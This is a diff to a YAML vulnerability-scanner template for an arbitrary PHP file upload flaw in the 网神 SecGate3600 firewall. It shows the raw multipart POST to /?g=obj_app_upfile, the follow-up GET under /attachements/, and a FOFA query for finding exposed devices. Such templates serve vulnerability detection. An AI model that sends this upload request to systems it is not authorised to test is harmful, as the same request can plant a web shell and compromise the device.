@@ -1,37 +1,41 @@
-id: SecGate3600-obj_app_upfile-UploadFile
+id: WangShenSecGate3600-obj_app_upfile-FileUpload
 
 info:
   name: 网神SecGate3600防火墙-obj_app_upfile-任意文件上传漏洞
-  author: mhb17
+  author: candada
   severity: critical
-  tags: upload
+  description: description
+  reference:
+    - https://
   metadata:
     fofa-query: fid="1Lh1LHi6yfkhiO83I59AYg=="
-    
+  tags: tags
+
 variables:
-  file_name: "{{to_lower(rand_text_alpha(8))}}.php"
-  
-requests:
+  file_name: "test123.php"
+  match_str: "test123"
+
+http:
   - raw:
       - |-
         POST /?g=obj_app_upfile HTTP/1.1
         Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+        Accept-Encoding: gzip, deflate, br
         Accept: */*
-        Accept-Encoding: gzip, deflate
-        Content-Length: 549
+        Connection: close
         Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
-        User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 
         ------WebKitFormBoundaryJpMyThWnAxbcBBQc
         Content-Disposition: form-data; name="MAX_FILE_SIZE"
 
-        10000000
+        1000000000
         ------WebKitFormBoundaryJpMyThWnAxbcBBQc
         Content-Disposition: form-data; name="upfile"; filename="{{file_name}}"
-        Content-Type: text/plain
+        Content-Type: image/jpeg
 
-        <?php phpinfo();?>
-
+        {{match_str}}
         ------WebKitFormBoundaryJpMyThWnAxbcBBQc
         Content-Disposition: form-data; name="submit_post"
 
@@ -41,16 +45,15 @@ requests:
 
         0b9d6b1ab7479ab69d9f71b05e0e9445
         ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
-      - |+
+
+      - |
         GET /attachements/{{file_name}} HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
-        Connection: close
 
-    req-condition: true
+    matchers-condition: and
     matchers:
       - type: dsl
-        dsl:
-          - "contains(body_2, 'phpinfo()')"
+        dsl: 
           - "status_code_1 == 302 && status_code_2 == 200"
+          - "contains(body_2, '{{match_str}}')"
         condition: and
